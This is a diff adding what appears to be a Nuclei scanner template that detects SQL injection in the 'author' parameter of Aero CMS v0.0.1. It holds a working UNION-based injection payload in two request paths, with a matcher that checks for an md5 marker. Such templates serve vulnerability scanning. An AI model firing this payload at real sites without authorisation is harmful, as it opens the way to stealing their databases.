@@ -1,0 +1,35 @@
+id: aerocms-sqli
+
+info:
+  name: Aero CMS v0.0.1 - SQL Injection
+  author: shivampand3y
+  severity: high
+  description: |
+    The `author` parameter from the AeroCMS-v0.0.1 CMS system appears to be vulnerable to SQL injection attacks.The malicious user can dump-steal the database, from this CMS system and he can use it for very malicious purposes.
+  reference:
+    - https://www.exploit-db.com/exploits/51022
+    - https://github.com/MegaTKC/AeroCMS/releases/tag/v0.0.1
+  metadata:
+    verified: true
+  tags: aero,cms,sqli
+
+variables:
+  num: "999999999"
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+      - '{{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(num)}}'
+
+      - type: status
+        status:
+          - 200
